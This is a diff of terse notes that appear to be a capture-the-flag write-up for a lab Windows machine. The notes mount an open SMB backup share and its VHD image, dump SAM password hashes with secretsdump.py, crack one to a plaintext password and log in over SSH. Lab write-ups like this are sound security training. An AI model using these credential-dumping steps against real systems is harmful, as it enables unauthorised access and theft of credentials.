@@ -1,0 +1,25 @@
+weird but the machine ha also an SSH port open
+
+no LDAP
+
+found a public smb shares containing a VHD file. too big to transfer so:
+
+mount //10.10.10.134/Backups /mnt -o user=,password=
+
+then navigate to the VHD and mount that too with another tool:
+
+guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
+
+you now have a full copy of the filesystem with full access to it. We can dump SAM hashes from registry (which is for sure not in use since its a copy):
+
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+
+only crackable one gives (cracking using crackstation or any other tool):
+
+L4mpje:bureaulampje
+
+trying ssh with it works
